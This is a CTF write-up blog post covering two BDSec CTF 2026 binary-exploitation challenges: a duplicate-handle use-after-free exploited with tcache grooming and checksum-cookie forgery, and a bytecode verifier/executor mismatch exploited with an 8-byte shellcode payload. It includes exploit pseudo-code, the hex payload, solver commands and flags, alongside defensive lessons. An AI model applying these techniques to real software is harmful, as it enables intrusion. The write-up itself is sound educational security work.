---
title: "BDSec CTF 2026 Pwn Writeup: 2 Challenges Solved"
slug: "bdsec-ctf-2026-pwn-writeup"
description: "BDSec CTF 2026 pwn step-by-step: Phantom Device duplicate-handle UAF with tcache grooming to overlap a session and forge the privileged role plus two checksums; Muktir Shongket verifier-executor semantic mismatch where ROUTE jumps into a SIGNAL literal."
date: 2026-07-22T15:00:00Z
lastmod: 2026-07-22T15:00:00Z
draft: false
author: "CyberSecurity Elite Team"
categories: ["CTF Writeups"]
series: ["BDSec CTF 2026"]
tags:
  - "bdsec ctf"
  - "bdsec ctf 2026"
  - "bangladesh ctf"
  - "ctf writeup"
  - "pwn"
  - "binary exploitation"
  - "linux elf exploitation"
  - "use after free"
  - "handle lifetime bug"
  - "reference count bug"
  - "tcache grooming"
  - "glibc heap"
  - "calloc tcache bypass"
  - "session overlap"
  - "cookie leak"
  - "bytecode verifier bypass"
  - "verifier executor mismatch"
  - "jit shellcode"
  - "jump into literal"
  - "non-pie fixed function target"
keywords:
  - "bdsec ctf 2026 pwn writeup"
  - "bdsec phantom device writeup"
  - "bdsec muktir shongket writeup"
  - "duplicate handle uaf ctf 2026"
  - "session overlap privileged role forge"
  - "tcache grooming calloc bypass"
  - "cookie recovery from checksum ctf"
  - "custom bytecode verifier vs executor semantic gap"
  - "route opcode jmp rel32 jump into signal literal"
  - "8-byte hidden shellcode inside bytecode literal"
  - "non-pie internal flag-printing function call"
  - "0x401bb0 mov eax call rax ret"
  - "reverse engineering menu-driven challenge"
  - "handle refcount audit pattern"
  - "ctf step by step 2026"
toc: true
cover:
  image: "/images/articles/bdsec-ctf-2026-pwn-writeup.png"
  alt: "BDSec CTF 2026 pwn writeup — two challenges solved covering Phantom Device a stripped x86-64 ELF menu-driven driver simulator whose duplicate-handle operation copies the descriptor without incrementing the object refcount so releasing one descriptor frees the chunk while the duplicate remains a valid read-write handle giving a use-after-free primitive that after a seven-device tcache-fill grooming sequence overlaps the freed device chunk with a newly-created session then leaks uid and nonce recovers the per-process cookie from checksum1 = rol64(uid ^ cookie, 17) ^ nonce ^ 0xa55aa55aa55aa55a and patches the session role to 0x1337133713371337 with the corrected checksum2, and Muktir Shongket a stripped x86-64 ELF that both verifies and JIT-translates a custom five-opcode bytecode (WAIT SIGNAL ROUTE END FREEDOM) where the verifier walks ROUTE targets only for in-bounds checks while the executor lowers ROUTE to an x86 jmp rel32 allowing a 12-byte hex payload 300220b8b01b4000ffd0c340 to jump into the 8-byte literal of a following SIGNAL order whose bytes decode to mov eax 0x401bb0 call rax ret invoking the internal flag-printing function of the non-PIE binary"
---

BDSec CTF 2026's pwn track shipped two 100-point challenges that both hinge on the same class of bug — **two components of the same program disagree about the meaning of one operation** — but at completely different levels of the stack. **Phantom Device** is a menu-driven device-driver simulator where the *duplicate handle* operation copies the descriptor but does not update the object refcount, so *release* and *duplicate* disagree about how many live pointers exist. That mismatch drops a stale device handle over a session-object allocation and gives a read/write primitive that leaks the process cookie and forges the privileged role. **Muktir Shongket** is a custom-bytecode terminal where the *verifier* and the *executor* disagree about what a `ROUTE` order does: the verifier walks past it as metadata, the executor translates it into an x86 `jmp rel32`. That jump lands inside a later `SIGNAL` literal, whose bytes were never inspected as instructions, and calls the internal `flag.txt` printer at a fixed address in the non-PIE binary.

Handouts, per-challenge READMEs, and solver scripts live at [Abdelkad3r/BDSecCTF-2026](https://github.com/Abdelkad3r/BDSecCTF-2026). Paired writeup on the same event: [BDSec CTF 2026 reverse writeup](/ctf-writeups/bdsec-ctf-2026-reverse-writeup/) covers Easy RE Challenge, Night Shift, and Borrowed Memory. Adjacent pwn writeups on the site: [OmniCTF 2026 Quals pwn writeup](/ctf-writeups/omnictf-2026-quals-pwn-writeup/) walks a `_IO_2_1_stdout_` tcache poison on glibc 2.39 and a Windows kernel-driver double-read race; [BroncoCTF 2026 pwn + reverse writeup](/ctf-writeups/broncoctf-2026-pwn-reverse-writeup/) covers a seccomp-restricted ORW shellcode and a four-gate `gets()` ret2win chain; [Junior.Crypt 2026 pwn + reverse writeup](/ctf-writeups/junior-crypt-2026-pwn-reverse-writeup/) has adjacent primitives worth pairing.

## The two BDSec CTF 2026 pwn challenges

| Challenge | Points | Bug class / primitive | Flag |
|---|---|---|---|
| Phantom Device | 100 | Menu-driven Linux ELF simulating a driver interface with device handles, duplicated handles, and session objects. Both device and session objects allocate as `0x100`-byte `calloc` chunks. Duplicate-handle copies the descriptor into the first free descriptor slot and marks it active but **does not increment the device object's refcount**. Release-handle uses the refcount, so releasing the original descriptor decrements it to 0 and frees the underlying chunk; the duplicate descriptor still passes the active/type gates and now points at a freed chunk. Groom seven filler devices in and out to fill the `0x110` tcache bin, allocate the target device, duplicate it, release the original — the next `calloc(1, 0x100)` for a session now reuses that chunk. The stale device handle overlaps the session at offset 0. Read the session header, parse `(uid, nonce, checksum1, checksum2)`, recover the cookie via `cookie = ror64(checksum1 ^ nonce ^ 0xa55aa55aa55aa55a, 17) ^ uid`, then write `role = 0x1337133713371337` plus the corrected `checksum2 = rol64(nonce, 11) ^ cookie ^ rol64(uid + 0x5478547854785478, 29)`. Menu option 8 opens `flag.txt`. | `BDSEC{ph4nt0m_h4ndl35_n3v3r_d13}` |
| Muktir Shongket | 100 | Menu-driven Linux ELF that accepts a hex-encoded "coded transmission", verifies it as a five-opcode bytecode (`WAIT`, `SIGNAL <8-byte literal>`, `ROUTE <s8>`, `END`, `FREEDOM`), and then JIT-translates the same bytes into an `mmap`+`mprotect`-backed executable page. Verifier walks bytecode sequentially: `WAIT/SIGNAL/ROUTE/END` accepted, `FREEDOM` rejected. `ROUTE` is only checked for in-bounds target (`current_offset + 2 + operand < length`); the verifier does not follow it. The executor lowers `WAIT → 0x90`, `END → 0xc3`, `SIGNAL imm64 → eb 08 <8 literal bytes>`, and `ROUTE x → e9 <sign-extended x as rel32>`. Because `SIGNAL` places its 8 literal bytes into the executable page but immediately skips them with `jmp +8`, any `ROUTE` that lands mid-literal turns those bytes into instructions. Payload: `30 02` (`ROUTE +2`) chases into the SIGNAL literal `b8 b0 1b 40 00 ff d0 c3` (`mov eax, 0x401bb0; call rax; ret`) which invokes the internal flag printer of the non-PIE binary. Total hex: `300220b8b01b4000ffd0c340` — 12 bytes. | `BDSEC{mukt1r_5h0ngk3t_r34ch3d_th3_f13ld}` |

Both challenges share a discipline worth stating up front: **when two components of the same program disagree about the semantics of one operation, the disagreement is the exploit**. Phantom Device's *duplicate* and *release* disagree about ownership: duplicate creates a second owning handle, release trusts a refcount that duplicate never touched. Muktir Shongket's *verifier* and *executor* disagree about what a `ROUTE` opcode does: the verifier calls it inert metadata, the executor emits an unconditional relative jump. In both cases the attacker doesn't need a memory-corruption 0-day or a rope of ROP — the bug is literally a `git blame`-visible mismatch in intent between two functions in the same file, and the primitive falls out of picking the operation both sides handle differently.

## Methodology — audit the operations that touch a shared object

A pattern that worked on both challenges: **enumerate every operation that reads, writes, or transitions state on the shared object, then diff how each operation handles it**. Phantom Device has exactly six operations that touch the device-handle table (allocate, duplicate, read, write, release, and — indirectly — session create because it reuses the same size class from the same allocator). Diffing those six operations line-by-line surfaces the duplicate/release asymmetry in one pass: duplicate writes to the descriptor table, release reads from an unrelated field on the object. Muktir Shongket has exactly two operations that touch the bytecode buffer (verify and execute) and five opcodes to consider. Diffing verify against execute per opcode surfaces `ROUTE` as the only opcode where the two sides do materially different things — verify calls it a two-byte instruction with a metadata operand, execute calls it a jump — and the exploit is a straight consequence of that one asymmetry.

The correlate: **the JIT boundary is a trust boundary, and the verifier is the LSM**. In Muktir Shongket the executor turns untrusted bytes into native code. Whenever a program does that, the verifier is the only thing standing between the attacker and arbitrary execution — and the verifier must model the *exact translated CFG*, not the *bytecode's stated intent*. Any bytecode operation that can influence the executor's control flow (relative branches, indirect jumps, absolute stores into the code page) has to be modelled by the verifier as if the emitted native instruction were literally written by the attacker. Anything less is a semantic gap, and semantic gaps compose into exploits. Same principle applies to WASM sandbox escapes, eBPF verifier bypasses (CVE-2020-8835, CVE-2021-3490), and every JIT-spray-adjacent bug in JavaScript engines.

Per-challenge walkthroughs follow.

## 1. Phantom Device

100 points. Menu-driven driver simulator. Duplicate-handle skips the refcount update; release frees the object while a stale handle remains. Groom the tcache, overlap a freed device chunk with a session, forge the privileged role and both checksums, read the flag.

### Step 1 — Basic triage

```bash
file phantom_device
shasum -a 256 phantom_device
```

```text
phantom_device: ELF 64-bit LSB executable, x86-64, dynamically linked,
interpreter /lib64/ld-linux-x86-64.so.2,
BuildID[sha1]=07f3ae03e05f34ec00f692e7a85f790806c8f719,
for GNU/Linux 4.4.0, stripped
61a713269f89082469371b7d0aa1226119f3dd49c963960dcf737fcc5a1e107f  phantom_device
```

Stripped, dynamically linked x86-64. **Not PIE** — worth naming because it means the binary loads at a fixed base address (`0x400000`), so any internal function address (the flag printer, jump tables) is stable across runs and across the local vs remote instance.

`strings -a` surfaces the menu and the attack surface:

```text
1. Allocate device
2. Duplicate handle
3. Read device
4. Write device
5. Release handle
6. Create session
7. Inspect session
8. Request privileged data
9. Destroy session
flag.txt
Access denied.
```

Two object types (device, session), a duplicate operation, and a release operation. That combination is enough to name the bug class before touching the disassembler: **when both a duplicate and a release operate on a shared refcount, they must both mutate it — or the refcount is a lie**.

### Step 2 — Understand the heap objects

`main` and the top-level menu handlers surface two global tables:

| Table | Address | Purpose |
| --- | --- | --- |
| Device descriptor table | `0x4040c0` | 32 slots × 16 bytes (pointer, type, active) |
| Session pointer table   | `0x404080` | 8 slots × 8 bytes (session pointer) |

Each **device handle descriptor** is 16 bytes:

```text
+0x00  pointer to device object    (8 bytes)
+0x08  type, must be 1 for device  (4 bytes)
+0x0c  active flag                 (1 byte)
```

Allocating a device does `calloc(1, 0x100)` and populates the object header:

```text
+0x00  "ECIVEDHP" magic          (little-endian "PHDEVICE")
+0x08  reference count = 1
+0x10  size = 0xe0                 (payload length)
+0x18  cookie ^ object_pointer     (XOR-guarded self-pointer)
```

Creating a session also does `calloc(1, 0x100)` and populates a different header at the same 0x100 chunk footprint:

```text
+0x00  "OISSESHP" magic          (little-endian "PHSESSIO")
+0x08  uid                        (from PRNG)
+0x10  role                       (defaults to 1, privileged = 0x1337133713371337)
+0x18  nonce
+0x20  checksum1
+0x28  checksum2
+0x30  name                       (user-controlled up to 0xc8 bytes)
```

Two facts to hold onto: (1) **device and session objects share the `0x100` size class**, so if a device chunk gets freed, the next `calloc(1, 0x100)` for a session can reuse it; (2) **the device magic is at offset 0 of both objects**, which means after an overlap the session's magic is `OISSESHP` while the device descriptor's type field still says "1", so the device read/write gates still fire.

### Step 3 — Find the handle lifetime bug

Duplicate-handle validates an existing handle, finds the first free descriptor slot, and copies:

```text
new_desc.pointer = old_desc.pointer
new_desc.type    = 1
new_desc.active  = 1
```

That's it. **It never touches `*(old_desc.pointer + 8)` — the refcount is unchanged at 1**.

Release-handle checks the descriptor is active and typed as a device, then does the standard refcount decrement:

```text
--*(desc.pointer + 8)
if *(desc.pointer + 8) == 0:
    free(desc.pointer)
desc.active = 0
desc.pointer = 0
```

Because the refcount was never incremented at duplicate time, releasing either descriptor (the original or the duplicate) drops the count from 1 to 0 and frees the chunk. The *other* descriptor is not touched — it keeps its pointer, its type-1 tag, and its active flag. Read/Write on that descriptor still pass every gate and now dereference a freed chunk.

That is the whole primitive:

```text
allocate device      -> handle 0 valid, chunk A live, refcount = 1
duplicate handle 0   -> handle 1 valid, chunk A live, refcount = 1  (still!)
release handle 0     -> chunk A freed, handle 1 stale but "valid"
```

### Step 4 — Make the freed chunk become a session

The naïve exploit doesn't work reliably:

```text
allocate -> duplicate -> release -> create session
```

On modern glibc, `calloc` does not pull from the tcache. `calloc(1, 0x100)` for the session goes down a path that misses the tcache bin holding the freshly freed device chunk, so the session lands in a different chunk and the overlap doesn't happen.

The classic fix: **fill the tcache bin for this size first**. The size-class bin for a `0x100`-byte user request (with 16-byte allocator overhead) is the `0x110` tcache bin, which holds 7 entries by default. Fill it and the next release cannot go there — it takes the fastbin/unsorted path that `calloc` *does* consult.

Working grooming sequence:

```text
1. allocate 7 filler devices          (chunks F0..F6)
2. release  7 filler devices          (F0..F6 fill the 0x110 tcache bin)
3. allocate target device             (chunk T from unsorted/top)
4. duplicate target device            (handle 1 aliases T)
5. release target device via handle 0 (T cannot go to full tcache;
                                       lands on the path calloc consults)
6. create session                     (session_calloc reuses T)
```

Now the duplicate device handle (handle 1) and the session's pointer both refer to the same chunk. The session header sits at offset 0 of that chunk; a device read from handle 1 reads the session header verbatim.

### Step 5 — Reverse the privileged session check

Menu option 8 (`Request privileged data`) validates the session before opening `flag.txt`:

```text
sess.magic == 0x504853455353494f  ("OISSESHP")
sess.role  == 0x1337133713371337
sess.checksum1 == rol64(uid ^ cookie, 17) ^ nonce ^ 0xa55aa55aa55aa55a
sess.checksum2 == rol64(nonce, 11) ^ cookie ^ rol64(uid + 0x5478547854785478, 29)
```

The cookie is loaded once at process start from `/dev/urandom` and lives in a global. The normal `Create session` handler picks a fresh `uid` and `nonce`, sets `role = 1`, and computes `checksum1`/`checksum2` from the two formulas above. Both formulas involve `cookie`, so simply patching the role after the fact breaks both checksums.

But the overlap gives us **read**, so we can recover the cookie:

```text
checksum1 = rol64(uid ^ cookie, 17) ^ nonce ^ 0xa55aa55aa55aa55a
=> ror64(checksum1 ^ nonce ^ 0xa55aa55aa55aa55a, 17) = uid ^ cookie
=> cookie = ror64(checksum1 ^ nonce ^ 0xa55aa55aa55aa55a, 17) ^ uid
```

One rotation, three XORs. Every operand is either a known constant or a value we just leaked from the session header.

### Step 6 — Read, forge, request

The exploit chain in Python (pseudo-code):

```python
# 1. Groom the tcache
for i in range(7):
    allocate_device()          # F0..F6
for i in range(7):
    release_handle(i)          # fill 0x110 tcache

# 2. Set up the UAF
allocate_device()              # handle 7 -> chunk T
duplicate_handle(7)            # handle 8 -> chunk T (stale-in-waiting)
release_handle(7)              # chunk T freed, handle 8 stale

# 3. Overlap with session
session_id = create_session(name=b"x")   # session reuses chunk T

# 4. Leak session header via stale device read
buf = read_device(handle=8, length=0x40)
uid       = u64(buf[0x08:0x10])
nonce     = u64(buf[0x18:0x20])
checksum1 = u64(buf[0x20:0x28])

# 5. Recover the cookie
cookie = ror64(checksum1 ^ nonce ^ 0xa55aa55aa55aa55a, 17) ^ uid

# 6. Forge the privileged session in place
forged = flat(
    p64(0x1337133713371337),               # role
    p64(nonce),                            # keep nonce
    p64(rol64(uid ^ cookie, 17) ^ nonce ^ 0xa55aa55aa55aa55a),   # csum1
    p64(rol64(nonce, 11) ^ cookie ^ rol64(uid + 0x5478547854785478, 29)),  # csum2
)
write_device(handle=8, offset=0x10, data=forged)

# 7. Read the flag
send(b"8\n" + str(session_id).encode() + b"\n")
```

Running the shipped solver against the target:

```bash
python3 solve.py 45.56.67.129 51429
```

```text
BDSEC{ph4nt0m_h4ndl35_n3v3r_d13}
```

Per-challenge README + solver: [pwn/phantom-device](https://github.com/Abdelkad3r/BDSecCTF-2026/tree/main/pwn/phantom-device).

Three portable lessons. **Every `duplicate` needs a paired `retain`, every `release` needs a paired `decrement`.** Whenever a program lets multiple descriptors hold the same underlying resource, at least one of them not touching the refcount is game-over. Audit CoW-style dup operations first; they are the most common failure mode. **`calloc` does not touch the tcache on modern glibc.** Any UAF-into-fresh-allocation trick that targets a `calloc` allocation has to fill the tcache first. Seven fillers for the target size class is the standard drill. **Cookie-guarded fields are only guarding what you compare them against.** Phantom Device's cookie enters both checksum1 and checksum2. Because checksum1 is XOR-composed with the cookie and everything else in that XOR is leaked, the cookie is *recoverable*, not opaque. Cookie-guarded fields require that the cookie combine with something the attacker can't leak — otherwise they are just obfuscation.

## 2. Muktir Shongket

100 points. Custom-bytecode terminal. Verifier and executor disagree about the `ROUTE` opcode. Jump into the middle of a `SIGNAL` literal, land on `mov eax, 0x401bb0; call rax; ret`, read the flag.

### Step 1 — Basic triage

```bash
file muktir_shongket
shasum -a 256 muktir_shongket
```

```text
muktir_shongket: ELF 64-bit LSB executable, x86-64, dynamically linked,
interpreter /lib64/ld-linux-x86-64.so.2,
BuildID[sha1]=0537049e73f3b5bfb1cc1b6b0949c04a0640f25d,
for GNU/Linux 4.4.0, stripped
afbb07276568fbec27f9eb21a822a25f590e3ecdfbee289c6e0cfc318a701e5c  muktir_shongket
```

Stripped, dynamically linked, **not PIE** — again worth naming. Non-PIE means internal function addresses are stable. The `flag.txt`-printing helper lives at `0x401bb0` on both local and remote instances.

`strings -a` reveals the menu, the bytecode mnemonics, and — critically — the executor's toolchain:

```text
1. Upload coded transmission
2. Inspect decoded orders
3. Verify transmission
4. Execute transmission
5. Clear terminal
6. Disconnect
SIGNAL
ROUTE
END
WAIT
FREEDOM
flag.txt
Rejected: unauthorized freedom broadcast.
```

`rabin2 -i` (or `objdump -T`) shows `mmap`, `mprotect`, and `write` in the imports. That triad on a menu-driven interpreter is a dead giveaway: **the executor allocates an `RW` page, writes translated code into it, flips it to `RX`, and calls it**. This is JIT territory. The verifier is the only defence between user bytes and native execution.

### Step 2 — Map the terminal state

The upload handler decodes the hex string into a global buffer:

```text
0x404080  decoded transmission bytes
0x404068  decoded transmission length
0x404060  verified flag (0 = not verified, 1 = verified)
```

Uploading a new transmission resets `verified = 0`. Execution refuses to run unless `verified == 1`. The intended flow is:

```text
upload  ->  (optional) inspect  ->  verify  ->  execute
```

Verify sets `verified = 1` only if the walk completes without hitting `FREEDOM` and at least one `END` exists.

### Step 3 — Decode the bytecode

The inspect handler prints one decoded order per line, which gives away the encoding cleanly:

| Opcode | Name    | Size | Operand                        |
| ---: | --------- | ---: | ------------------------------ |
| `0x10` | `WAIT`    | 1    | none                           |
| `0x20` | `SIGNAL`  | 9    | 8-byte little-endian literal   |
| `0x30` | `ROUTE`   | 2    | 1-byte route operand (signed)  |
| `0x40` | `END`     | 1    | none                           |
| `0xf0` | `FREEDOM` | 1    | none                           |

A direct `FREEDOM`:

```text
f0 40
```

Inspect:

```text
0000    FREEDOM
0001    END
```

Verify:

```text
Rejected: unauthorized freedom broadcast.
```

So the naïve "just call `FREEDOM`" path is closed. We need to make the executor do something the verifier didn't see. That's the entire challenge.

### Step 4 — Understand the verifier

Reversed verifier walk:

```text
i = 0
while i < transmission_length:
    op = transmission[i]
    if op == 0x10:              i += 1                     # WAIT
    elif op == 0x20:            i += 9                     # SIGNAL
    elif op == 0x30:
        target = i + 2 + sign_extend(transmission[i + 1])
        if target >= transmission_length:
            reject("out-of-bounds route")
        i += 2                                             # continue linearly
    elif op == 0x40:            i += 1; end_seen = True    # END
    elif op == 0xf0:            reject("freedom")          # FREEDOM
    else:                       reject("unknown opcode")

if not end_seen:
    reject("no END")
verified = 1
```

Two facts:

1. `ROUTE` is only checked for **in-bounds target**. The verifier does not follow the route. It walks past `ROUTE` at `i + 2`, ignoring the target entirely.
2. `SIGNAL`'s 8 literal bytes are treated as opaque data. Whatever we stuff there is never inspected.

That's the semantic gap.

### Step 5 — Understand the executor

Reversed executor translation into an `mmap`+`mprotect` code page (approximate machine code — actual widths match the emitted native instructions):

| Bytecode        | Translated x86              | Notes                        |
| --------------- | --------------------------- | ---------------------------- |
| `WAIT`          | `90`                        | `nop`                        |
| `END`           | `c3`                        | `ret`                        |
| `SIGNAL imm64`  | `eb 08 <8 literal bytes>`   | jump over the literal        |
| `ROUTE x`       | `e9 <sign-extended x rel32>`| unconditional `jmp`          |
| `FREEDOM`       | (unreachable, rejected)     | never emitted                |

The `SIGNAL` translation is the critical piece: it emits `jmp +8` *followed by* the 8 literal bytes, then continues emitting for the next order. Under normal control flow, the 8 literal bytes are dead data (skipped by `jmp +8`). But if control flow enters those 8 bytes from anywhere else in the emitted page, they are executed as instructions.

`ROUTE` gives us exactly that entry: `e9 <rel32>` will land wherever we point it, including inside another order's literal.

### Step 6 — Find a target function

The binary has a helper at `0x401bb0` that opens `flag.txt` and prints its contents. Identify it by chasing the `"flag.txt"` string reference:

```bash
objdump -d muktir_shongket | grep -B2 "flag.txt"
```

Or find it via the `[+] Freedom broadcast authenticated.` cross-reference. Either lands you at the same function. Because the binary is non-PIE, `0x401bb0` is fixed and identical on the remote instance.

The hidden code we want executed:

```asm
mov eax, 0x401bb0    ; b8 b0 1b 40 00
call rax             ; ff d0
ret                  ; c3
```

Machine code: `b8 b0 1b 40 00 ff d0 c3` — exactly 8 bytes, which fits perfectly inside one `SIGNAL` literal.

### Step 7 — Build the payload

Target layout in the executable page after translation:

```asm
;         emitted bytes                          bytecode source
0x00: e9 02 00 00 00                             ; ROUTE +2
0x05: eb 08                                      ; SIGNAL wrapper (jmp +8)
0x07: b8 b0 1b 40 00                             ; SIGNAL literal byte 0..4
0x0c: ff d0                                      ; SIGNAL literal byte 5..6
0x0e: c3                                         ; SIGNAL literal byte 7
0x0f: c3                                         ; END
```

Execution starts at `0x00`. `ROUTE +2` becomes `jmp +2` (from the end of its own 5-byte encoding, so target is `0x05 + 2 = 0x07`), landing exactly on the first byte of the SIGNAL literal. From there:

- `b8 b0 1b 40 00` → `mov eax, 0x401bb0`
- `ff d0`         → `call rax` (calls the flag printer, which prints the flag and returns)
- `c3`            → `ret` (returns cleanly from the JIT page)

Bytecode source:

```text
30 02                                      ; ROUTE +2
20 b8 b0 1b 40 00 ff d0 c3                 ; SIGNAL <hidden shellcode>
40                                         ; END
```

Concatenated as hex, uploaded as the terminal wants it:

```text
300220b8b01b4000ffd0c340
```

Twelve bytes. Verifier accepts:

```text
0000    ROUTE     +2
0002    SIGNAL    0xc3d0ff00401bb0b8
000b    END
```

No `FREEDOM`, in-bounds `ROUTE`, at least one `END`. Verifier writes `verified = 1`.

Execute:

```text
Menu:  1  (upload)
Data:  300220b8b01b4000ffd0c340
Menu:  3  (verify)  -> Approved
Menu:  4  (execute) -> flag printed
```

Full remote run:

```bash
python3 solve.py 45.56.67.129 53916
```

```text
BDSEC{mukt1r_5h0ngk3t_r34ch3d_th3_f13ld}
```

Per-challenge README + solver: [pwn/muktir-shongket](https://github.com/Abdelkad3r/BDSecCTF-2026/tree/main/pwn/muktir-shongket).

Three portable lessons. **A verifier that walks the bytecode linearly cannot secure an executor that emits branches.** The verifier must model the *emitted* control-flow graph, not the *source* one. If any opcode compiles to a branch, the verifier has to follow that branch and check every reachable target — otherwise it's decorative. **Bytecode operations that compile to `data` are not data if any operation can compile to a jump.** SIGNAL's literal bytes are "data" only under the assumption that no reachable branch lands on them. Introduce ROUTE, and every SIGNAL literal is a potential shellcode slot. **Non-PIE binaries hand you fixed function addresses for free.** Any pwn challenge where the intended solution is "leak the base, ROP" collapses to "call the intended flag printer directly" when the binary is non-PIE. Check `checksec` (or just `file`) before you build a leak chain — you may not need one.

## Cross-cutting attacker + defender notes

Four patterns recur across the BDSec CTF 2026 pwn track and translate directly into review or triage heuristics.

**Refcount-only lifetimes need transactional operations.** Phantom Device's bug is that `duplicate` and `retain` were conceptually the same operation but implemented separately, with the retain half missing. The safest pattern in native code is to make `duplicate` a wrapper that always calls a `retain(obj)` primitive under the same lock as descriptor creation, and to make `release` decrement + free under the same lock. Whenever you see a duplicate operation that mutates a descriptor table without touching the underlying object, treat it as a refcount audit finding.

**tcache-fill grooming is not a trick, it's the required setup for any `calloc` UAF.** On modern glibc (2.28+), `calloc` skips the tcache to avoid returning zeroed-but-dirty chunks. Any exploit that needs a freed chunk to be reused by a `calloc` allocation must fill the corresponding tcache bin first. Seven fillers of the target size class is the standard number; the bin defaults to 7 entries. If your exploit "should work" but the overlap never happens, tcache fill is the first thing to try.

**Cookie-guarded fields protect what they *cannot* be XORed out of.** Whenever a program stores `checksum = f(secret, x)` and lets the attacker read the checksum plus `x`, the secret is recoverable by inverting `f`. This is the same shape as authenticated-encryption forgeries against reused nonces, or CBC-MAC attacks against unauthenticated length fields. If your integrity scheme lets the attacker see both inputs and outputs of the mixing function, the cookie is worthless — you need an unrecoverable second component (an HMAC output, an AEAD tag, a signature) that never appears in a leakable field.

**Verifier/executor mismatches are the pwn equivalent of TOCTOU.** eBPF verifier bypasses (CVE-2020-8835 pointer-arithmetic, CVE-2021-3490 32-bit ALU sign-extension, CVE-2022-23222 pointer-arithmetic sign check), V8 turbofan speculation escapes (CVE-2019-5786, CVE-2021-30554), and the whole JIT-spray literature all reduce to the same shape: verifier and executor disagree about the meaning of one operation, attacker picks that operation, arbitrary execution follows. If you build a JIT, your CI must test that the verifier and the executor agree on *every* opcode's emitted CFG on a per-commit basis. Muktir Shongket is a two-opcode subset of that same class of bug.

## Frequently asked questions

### What is BDSec CTF 2026?

BDSec CTF 2026 is a Bangladesh-hosted Capture-the-Flag competition with challenges across reverse engineering, pwn, and web categories. Flags use the `BDSEC{...}` namespace (some web challenges use lowercase `bdsec{...}`). This writeup covers the two pwn challenges I solved: Phantom Device (100 pts) and Muktir Shongket (100 pts). The paired [BDSec CTF 2026 reverse writeup](/ctf-writeups/bdsec-ctf-2026-reverse-writeup/) covers Easy RE Challenge, Night Shift, and Borrowed Memory. Per-challenge READMEs and solver scripts at [Abdelkad3r/BDSecCTF-2026](https://github.com/Abdelkad3r/BDSecCTF-2026).

### What's the use-after-free primitive in Phantom Device?

Duplicate-handle copies a device descriptor into a free slot but does not increment the underlying device object's refcount. Release-handle uses the refcount to decide whether to free the object. Because the count was never bumped at duplicate time, releasing either descriptor drops the count from 1 to 0 and frees the chunk while the other descriptor still passes the active/type gates. That other descriptor is now a stale read/write handle over the freed chunk.

### Why do you need to fill the tcache before overlapping the device with a session?

On modern glibc (2.28+), `calloc` does not consult the tcache — it takes a separate allocator path to guarantee zero-initialised memory that isn't just dirty-then-cleared. If you free a chunk and then call `calloc(1, 0x100)`, `calloc` misses the tcache bin containing your freed chunk and lands somewhere else. Filling the `0x110` tcache bin with seven prior allocations means the freshly-freed target chunk cannot go into tcache; it drops onto the fastbin/unsorted path that `calloc` does consult, and the next session `calloc` reuses it.

### How do you recover the process cookie from checksum1?

The cookie is loaded once from `/dev/urandom` and combined into `checksum1 = rol64(uid ^ cookie, 17) ^ nonce ^ 0xa55aa55aa55aa55a`. Because XOR is self-inverse and `rol` is invertible with `ror`, you can solve for `cookie` given `checksum1`, `uid`, and `nonce`: `cookie = ror64(checksum1 ^ nonce ^ 0xa55aa55aa55aa55a, 17) ^ uid`. All three inputs are leaked by the initial device read across the session overlap.

### Why does ROUTE bypass verification in Muktir Shongket?

The verifier is a linear walk over the bytecode. For `ROUTE`, it only checks that the sign-extended target lies inside the transmission buffer, then walks past `ROUTE` at `i + 2` and continues verifying the next order. It never follows the route. The executor, on the other hand, translates `ROUTE x` into `e9 <sign-extended x rel32>` — an unconditional x86 `jmp`. So the executor's control flow visits code paths the verifier's walk skipped, and any bytes in a `SIGNAL` literal (which the verifier treats as opaque data) can be turned into instructions by landing a `ROUTE` in the middle of them.

### How does the 8-byte SIGNAL literal encode `call flag_printer`?

The bytes `b8 b0 1b 40 00 ff d0 c3` decode as x86-64 `mov eax, 0x401bb0; call rax; ret`. `0x401bb0` is the fixed address of the binary's internal `flag.txt`-printing helper — non-PIE means that address is stable at all times. The whole hidden shellcode fits in exactly 8 bytes, which is exactly what one SIGNAL literal holds, so no chaining is required. `ROUTE +2` lands us on the first byte of the literal; the three-instruction sequence returns cleanly from the JIT page, and the flag prints to stdout before the executor returns to the menu loop.

### Why is calling 0x401bb0 enough — don't you need to bypass a sandbox?

There is no sandbox on this binary. The internal helper `0x401bb0` opens `flag.txt` and writes its contents to stdout with no additional checks. The privileged-broadcast check (`FREEDOM`) is enforced at the *verifier*, not at the helper — and by design, the verifier is the only barrier to running that helper. Once we reach `0x401bb0` from the JIT page, no further work is needed; the flag prints and the executor returns.

### Where can I find the solver scripts?

Per-challenge READMEs, handouts, and solver scripts at [Abdelkad3r/BDSecCTF-2026](https://github.com/Abdelkad3r/BDSecCTF-2026). Both solvers are Python + `pwntools` and reproducible against the shipped binaries or the remote target. Phantom Device's solver handles the tcache fill, the duplicate/release sequencing, the leak parse, cookie recovery, and the session forgery end-to-end. Muktir Shongket's solver uploads the 12-byte payload, verifies, executes, and reads the flag — a total of four menu interactions.

## Closing notes

Two 100-point pwn challenges from very different corners of the stack, one shared discipline: **when two operations on the same object have different mental models of what the operation does, the disagreement is the exploit**. Phantom Device's duplicate/release disagreement gives a UAF that, with a standard tcache-fill grooming pass, overlaps a freed device chunk with a session and lets you leak the cookie, forge the privileged role, and read `flag.txt`. Muktir Shongket's verifier/executor disagreement gives a bytecode payload that verifies as three inert orders but executes as `mov eax, 0x401bb0; call rax; ret` inside a `SIGNAL` literal — and because the binary is non-PIE, calling the internal flag printer needs no leak. Both challenges are 12-line solvers once the disagreement is named.

The other tracks at the same event: the [BDSec CTF 2026 reverse writeup](/ctf-writeups/bdsec-ctf-2026-reverse-writeup/) covers Easy RE Challenge's XOR + ROL + additive + permutation stack, Night Shift's `5^8` pthread schedule brute-force, and Borrowed Memory's twelve-step offset VM. Adjacent pwn writeups on the site that share techniques: [OmniCTF 2026 Quals pwn writeup](/ctf-writeups/omnictf-2026-quals-pwn-writeup/) walks a glibc 2.39 `_IO_2_1_stdout_` tcache poison whose grooming shape rhymes with Phantom Device's session overlap, plus a Windows kernel-driver `COPY` double-read race whose "two components disagree about the operation" shape rhymes exactly with Muktir Shongket's verifier/executor mismatch; [BroncoCTF 2026 pwn + reverse writeup](/ctf-writeups/broncoctf-2026-pwn-reverse-writeup/) covers a Roblox Lua sandbox whose `read`/`write` disagree about TypeTag semantics, another verifier/executor mismatch in miniature; [Junior.Crypt 2026 pwn + reverse writeup](/ctf-writeups/junior-crypt-2026-pwn-reverse-writeup/) has adjacent heap-grooming primitives. Full [CTF writeups index](/ctf-writeups/) for the rest.

<script type="application/ld+json">
{
  "@context": "https://schema.org",
